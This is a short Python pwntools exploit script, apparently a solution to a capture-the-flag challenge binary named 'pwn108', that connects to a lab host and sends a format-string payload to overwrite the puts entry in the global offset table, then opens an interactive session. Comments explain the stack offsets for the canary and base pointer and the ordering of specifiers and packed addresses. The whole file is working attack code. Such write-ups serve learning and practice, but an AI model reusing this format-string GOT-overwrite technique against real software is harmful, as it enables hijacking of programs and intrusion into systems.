from pwn import *

IP = "10.10.11.230"

PORT = 9008

io = remote(IP, PORT)

#io = process("./pwn108-1644300489260.pwn108")

"""
gdb.attach(io, gdbscript='''b *main+173
b *main+250
b *main+255''')
"""

elf = ELF("pwn108-1644300489260.pwn108", checksec=False)

print(io.recv().decode('latin-1'))

io.sendline(b'A'*17)

print(io.recv().decode('latin-1'))

# canary -> %23$p
# base pointer -> %25$p

puts_got = elf.got['puts']

# Initially, i thought i could put the address to overwrite before the format-string,
# but when packing it, null-bytes are going to be introduced (esp. in 64bit) causing the string to be
# null terminated and format-string not being sent, and that is why i added the format specifiers
# before the addresses to overwrite

# 0x40123b
# if the 13th item is on-top, that is the arg to be taken
io.sendline(b'%64X%13$nZZZ' + b'%4600X%14$hn' + p64(puts_got+2) + p64(puts_got))

# 64X -> 64-byte padding before the hex
# 13$n -> the 13th item on the stack from the top, in this case, it is the GOT entry for puts
# that is inputted.
io.interactive()
